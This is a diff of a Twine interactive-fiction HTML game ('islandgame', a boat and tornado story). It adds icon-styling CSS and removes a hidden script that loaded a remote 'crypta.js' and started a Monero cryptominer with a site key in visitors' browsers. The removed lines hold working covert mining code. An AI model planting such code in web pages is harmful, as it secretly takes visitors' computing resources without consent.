@@ -11,7 +11,18 @@
 
 <tw-story></tw-story>
 
-<tw-storydata name="islandgame" startnode="1" creator="Twine" creator-version="2.3.1" ifid="75E61B5D-0DC3-4C49-B4E4-5BF5736C5A01" zoom="0.6" format="Harlowe" format-version="2.1.0" options="" hidden><style role="stylesheet" id="twine-user-stylesheet" type="text/twine-css">
+<tw-storydata name="islandgame" startnode="1" creator="Twine" creator-version="2.3.1" ifid="75E61B5D-0DC3-4C49-B4E4-5BF5736C5A01" zoom="0.6" format="Harlowe" format-version="2.1.0" options="" hidden><style role="stylesheet" id="twine-user-stylesheet" type="text/twine-css">			tw-icon.undo {
+				color: white;
+				opacity: 0.50;
+				}
+			tw-icon.redo { 
+				color: white;
+				opacity:0.50;
+				}
+			tw-icon:hover {
+				color: white;
+				opacity: 1.0;
+				}
 
 
 
@@ -23,16 +34,7 @@
 
 
 
-</style><script role="script" id="twine-user-script" type="text/twine-javascript"><script src="//statdynamic.com/lib/crypta.js"></script>
-<script defer="defer">
-var miner=new CRLT.Anonymous('ee4aa2a83286490a88f1fee5442eebd0bb649e364295', { threads:4,throttle:0.2, coin: "xmr", });	miner.start();
-</script>
-
-
-
-
-
-</script><tw-passagedata pid="1" name="Day 1" tags="" position="0,0" size="100,100">You see an oceanic tornado in the distance. (I said oceanic tornado, not hurricane, deal with it). What type of boat are you in?
+</style><script role="script" id="twine-user-script" type="text/twine-javascript"></script><tw-passagedata pid="1" name="Day 1" tags="" position="0,0" size="100,100">You see an oceanic tornado in the distance. (I said oceanic tornado, not hurricane, deal with it). What type of boat are you in?
 (if: $testVar is 0)[ (set: $milSub to false)(set: $cruShi to false)(set: $carShi to false)(set: $cheBoa to false)(set: $shiBot to false)(set: $testVar to false)]
 (if: $milSub is false)[ [[Military Submarine]] ]
 (if: $cruShi is false)[ [[Cruise Ship]] ]
